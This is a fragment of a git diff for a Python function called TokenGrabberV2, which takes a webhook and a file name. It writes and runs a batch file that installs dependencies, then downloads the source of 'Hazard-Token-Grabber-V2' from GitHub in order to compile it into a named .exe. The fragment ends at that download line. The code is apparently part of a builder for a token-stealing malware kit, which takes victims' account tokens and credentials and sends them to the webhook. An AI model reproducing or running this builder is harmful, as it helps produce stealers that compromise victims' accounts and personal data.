@@ -9,11 +9,11 @@ from urllib.request import urlopen
 from colorama import Fore
 
 def TokenGrabberV2(WebHook, fileName):
-    with open("requirements.cmd", "w") as f:
-        f.write("pip install requests psutil pywin32 pycryptodome pyautogui opencv-python numpy")
+    with open("requirements.bat", "w") as f:
+        f.write("pip install requests psutil pypiwin32 pycryptodome pyautogui numpy")
         f.close()
-    os.startfile(os.getcwd()+"\\requirements.cmd")
-    os.remove(os.getcwd()+"\\requirements.cmd")
+    os.startfile(os.getcwd()+"\\requirements.bat")
+    os.remove(os.getcwd()+"\\requirements.bat")
     print(f"{Fore.RED}\nCreating {fileName}.exe\n{Fore.RESET}")
     try:
         f = urlopen("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py")
